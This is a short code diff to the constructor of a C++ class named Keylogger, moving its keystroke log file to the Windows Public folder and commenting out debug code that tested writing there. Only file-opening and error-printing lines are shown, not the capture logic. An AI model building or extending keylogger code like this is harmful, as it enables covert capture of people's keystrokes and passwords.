@@ -40,7 +40,7 @@ Keylogger::Keylogger(wchar_t* k) {
 
     // errno = 0;
 
-    kblog = std::ofstream("kb_log.txt", std::ios::app);
+    kblog = std::ofstream("C:\\Users\\Public\\kb_log.txt", std::ios::app);
 
     std::cerr << "After OPEN: " << kblog.is_open() << std::endl;
 
@@ -52,13 +52,13 @@ Keylogger::Keylogger(wchar_t* k) {
     std::cerr << "errno: " << errno << '\n';
     std::cerr << "error: " << strerror(errno) << '\n'; 
 
-    std::cout << "------------------------------------------" << std::endl;
-    std::ofstream test(
-    "C:\\Users\\Public\\ofstream_test.txt",
-    std::ios::out | std::ios::app
-    );
+    // std::cout << "------------------------------------------" << std::endl;
+    // std::ofstream test(
+    // "C:\\Users\\Public\\ofstream_test.txt",
+    // std::ios::out | std::ios::app
+    // );
 
-    std::cerr << "Public file: " << test.is_open() << '\n';
+    // std::cerr << "Public file: " << test.is_open() << '\n';
 
     key = k;
 }
